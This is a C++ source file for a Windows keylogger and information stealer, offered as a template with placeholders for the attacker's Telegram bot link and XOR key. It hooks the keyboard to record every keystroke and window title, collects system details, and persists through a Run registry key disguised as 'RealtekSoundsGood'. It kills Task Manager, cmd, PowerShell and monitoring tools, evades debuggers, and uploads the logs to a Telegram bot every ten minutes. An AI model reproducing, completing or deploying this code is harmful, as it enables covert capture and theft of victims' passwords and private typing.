#include <Windows.h>
#include <iostream>
#include <thread>
#include <TlHelp32.h>
#include "json.hpp"
#include <fstream>
#include <iomanip>
#include <cctype>
#include <codecvt>
#include <sstream>
#include <mutex>
#include <curl/curl.h>

using json = nlohmann::json;

std::mutex mtx;

std::string thatsXOR(std::string data, int key) {
    if (IsDebuggerPresent()) {
        return "YOUR-FAKE-LINK";
    }
    std::string output = data;

    for (std::size_t i = 0; i < data.size(); i++) {
        output[i] = data[i] ^ key;
    }
    return output;
}

void sendAllData() {
    std::vector<std::string>paths = {
                    "C:\\Users\\Public\\Documents\\ModulesdumpReportPCdata.json",
                    "C:\\Users\\Public\\Documents\\Moduleshook.txt",
                    "C:\\Users\\Public\\Documents\\ModulesdumpofProcess.txt"
    };
   

    while(true){
        std::this_thread::sleep_for(std::chrono::seconds(2));

        for (std::size_t i = 0; i < paths.size(); i++) {
            CURL* curl = curl_easy_init();
            curl_mime* mime = curl_mime_init(curl);
            curl_mimepart* part = curl_mime_addpart(mime);

            //https://api.telegram.org/botYOUR-XOR-LINK/sendDocument
            
            std::string mainLink = "YOUR-XOR-LINK";
            std::string chat_id = "YOUR-XOR-CHATID";

            if (curl) {
                curl_mime_name(part, "chat_id");
                curl_mime_data(part, thatsXOR(chat_id, YOUR-KEY).c_str(), CURL_ZERO_TERMINATED);

                part = curl_mime_addpart(mime);
                curl_mime_name(part, "document");
                curl_mime_filedata(part, paths[i].c_str());

                curl_easy_setopt(curl, CURLOPT_URL, thatsXOR(mainLink, YOUR-KEY).c_str());
                curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

                std::lock_guard<std::mutex> lock(mtx);
                CURLcode res = curl_easy_perform(curl);

                if (res != CURLE_OK) { }

                curl_mime_free(mime);
                curl_easy_cleanup(curl);
            }
            else continue;
            
        }
        
        std::this_thread::sleep_for(std::chrono::minutes(10));
    }
}

void getPCdata() {
    SYSTEM_INFO si;
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);

    GlobalMemoryStatusEx(&ms);
    GetNativeSystemInfo(&si);

    json j;
    CHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer) / sizeof(buffer[0]);
    if (GetComputerNameExA(ComputerNameDnsFullyQualified, buffer, &size)) {
        j["PC-NAME"] = "NULL";
    }
    j["PC-NAME"] = buffer;
   
    DISPLAY_DEVICEA dd;
    dd.cb = sizeof(DISPLAY_DEVICEA);
    int adapterIndex = 0;

    while (EnumDisplayDevicesA(NULL, adapterIndex, &dd, 0)) {
        if (dd.StateFlags & DISPLAY_DEVICE_ACTIVE) {
            j["GPU_NOW"] = dd.DeviceString;
        }
        adapterIndex++;
        
    }
    if (adapterIndex == 0) {
        j["GPU"] = "Unknown";
    }

    switch (si.wProcessorArchitecture) {
        case 0: j["CPU_Type "] = "PROCESSOR_ARCHITECTURE_INTEL"; break;
        case 5: j["CPU_Type "] = "PROCESSOR_ARCHITECTURE_ARM"; break;
        case 6: j["CPU_Type "] = "PROCESSOR_ARCHITECTURE_IA64"; break;
        case 9: j["CPU_Type "] = "PROCESSOR_ARCHITECTURE_AMD64"; break;
        case 12: j["CPU_Type "] = "PROCESSOR_ARCHITECTURE_ARM64"; break;
            default: j["CPU_Type "] = "Unknown processor type!"; break;
    }
    j["Number_of_CPU"] = si.dwNumberOfProcessors;
    j["RAM_MAX_MB "] = ms.ullTotalPhys / (1024 * 1024);
    j["RAM_USED_% "] = ms.dwMemoryLoad;

    std::ofstream PCinfo("C:\\Users\\Public\\Documents\\ModulesdumpReportPCdata.json");
    if (!PCinfo) { std::cerr << "error!"; }
    PCinfo << std::setw(4) << j;

    PCinfo.close();
}

void findCloseTMG() { // CLOSE TASK MANAGER, REFMON, PERFMON, POWERSHELL, CMD
    while (true) {
        std::wstringstream buff;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        HWND fWind = GetForegroundWindow();
        DWORD tid;
        GetWindowThreadProcessId(fWind, &tid);

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);

        

        Process32First(hSnap, &pe);
        do {
            if (tid == pe.th32ProcessID) {
                buff << pe.szExeFile << std::right << std::setw(35) << "PID: " << pe.th32ProcessID
                << std::right << std::setw(35) << "ParentPID: " << pe.th32ParentProcessID << "\t <<< ACTIVE PROCESS " 
                << '\n' << '\n';
            }
            else {
                buff << pe.szExeFile << std::right << std::setw(35) << "PID: " << pe.th32ProcessID
                << std::right << std::setw(35) << "ParentPID: " << pe.th32ParentProcessID << '\n' << '\n';
            }
            if (_wcsicmp(pe.szExeFile, L"Taskmgr.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"powershell.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"mmc.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"resmon.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"cmd.exe") == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                TerminateProcess(hProcess, 1);
                CloseHandle(hProcess);
            }
        } while (Process32Next(hSnap, &pe));

        mtx.lock();
            std::wofstream _proc_all("C:\\Users\\Public\\Documents\\dumpOfProcess.txt", std::ios::trunc);
            _proc_all << buff.str();
            _proc_all.close();
        mtx.unlock();

        CloseHandle(hSnap);
        std::this_thread::sleep_for(std::chrono::seconds(4));
    }
    
}

void AddToAutoRun() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hkey;
    const char* szPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, szPath, 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegSetValueExA(hkey, "RealtekSoundsGood", 0, REG_SZ, (unsigned char*)path, strlen(path) + 1);
        RegCloseKey(hkey);
    }


}

LRESULT CALLBACK GetKey(int nCode, WPARAM wParam, LPARAM lParam) {

    std::ofstream keys_pressed;
    HWND fWind = GetForegroundWindow();
    static HWND lastWind = NULL;
    DWORD tid = GetWindowThreadProcessId(fWind, NULL);


    HKL KL = GetKeyboardLayout(tid);
    BYTE buf[256];
    if (!GetKeyboardState(buf)) { }
    buf[VK_SHIFT] = GetKeyState(VK_SHIFT);
    buf[VK_CAPITAL] = GetKeyState(VK_CAPITAL);
    buf[VK_CONTROL] = GetKeyState(VK_CONTROL);
    KBDLLHOOKSTRUCT* kbdlh = (LPKBDLLHOOKSTRUCT)lParam;

    
    if (fWind != lastWind) {
        lastWind = fWind;
        char buffer[260];
        if (!GetWindowTextA(lastWind, buffer, 260)) {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        std::lock_guard<std::mutex> lock(mtx);
        keys_pressed.open("C:\\Users\\Public\\Documents\\hook.txt", std::ios::app);
        keys_pressed << '\n' << " PROGRAMM OPENED " << buffer << " PROGRAMM OPENED " << '\n';
        keys_pressed.close();
    }

    if (wParam == WM_KEYDOWN) {
        std::lock_guard<std::mutex> lock(mtx);
        keys_pressed.open("C:\\Users\\Public\\Documents\\hook.txt", std::ios::app);
        switch(kbdlh->vkCode){
            case VK_RETURN: keys_pressed << "\n"; break;
            case VK_SPACE: keys_pressed << " "; break;
            case VK_BACK: keys_pressed << "(BSE)"; break;
            default: {
                wchar_t buffer[5];
                if (ToUnicodeEx(kbdlh->vkCode, kbdlh->scanCode, buf, buffer, 5, 2, KL) > 0) {
                    std::wstring_convert<std::codecvt_utf8<wchar_t>>myconv;
                    std::string _utf_8str = myconv.to_bytes(buffer[0]);
                    keys_pressed << _utf_8str.c_str();
                }
                

            }
        }
        keys_pressed.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE l, HINSTANCE d, LPSTR lpCmdLine, int one) {
    
    HHOOK mainHook = SetWindowsHookExW(WH_KEYBOARD_LL, GetKey, NULL, 0);
    if (mainHook == NULL) {
        std::cerr << "Error: " << GetLastError();
        return 1;
    }

    
    std::thread autoRun(AddToAutoRun);
    getPCdata();

    std::thread FindTMG(findCloseTMG);
    std::thread sendFiles(sendAllData);

    autoRun.detach();
    sendFiles.detach();
    FindTMG.detach();
    
    
    MSG msg;
    while ((GetMessage(&msg, NULL, 0, 0)) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(mainHook);
}
